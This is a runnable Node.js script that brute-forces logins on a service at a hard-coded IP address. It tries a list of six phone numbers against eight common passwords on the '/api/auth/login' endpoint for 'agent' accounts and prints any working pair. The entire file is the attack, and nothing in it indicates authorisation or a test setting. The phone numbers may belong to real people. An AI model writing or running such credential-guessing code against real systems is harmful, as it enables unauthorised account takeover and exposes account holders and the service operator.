const http = require('http');

function postRequest(path, body) {
  return new Promise((resolve) => {
    const postData = JSON.stringify(body);
    const req = http.request({
      hostname: '72.61.246.157',
      port: 3000,
      path: path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, data: JSON.parse(data) });
        } catch (e) {
          resolve({ status: res.statusCode, data });
        }
      });
    });

    req.on('error', (err) => resolve({ error: err.message }));
    req.on('timeout', () => {
      req.destroy();
      resolve({ error: 'timeout' });
    });

    req.write(postData);
    req.end();
  });
}

const phones = [
  '9817881042',
  '9882095624',
  '9800482819',
  '9818397480',
  '9845123456',
  '9812987654'
];

const passwords = [
  '123456',
  'password',
  '12345678',
  '1234',
  'admin',
  'Pass@123',
  'Pass123',
  'skyrelief'
];

async function run() {
  for (const phone of phones) {
    for (const password of passwords) {
      const res = await postRequest('/api/auth/login', {
        phone,
        password,
        platform: 'agent'
      });
      if (res.data && res.data.s === 1) {
        console.log(`SUCCESS: phone=${phone}, password=${password}`);
        console.log(JSON.stringify(res.data, null, 2));
        return;
      }
    }
  }
  console.log("No valid agent credentials found using common passwords.");
}

run();
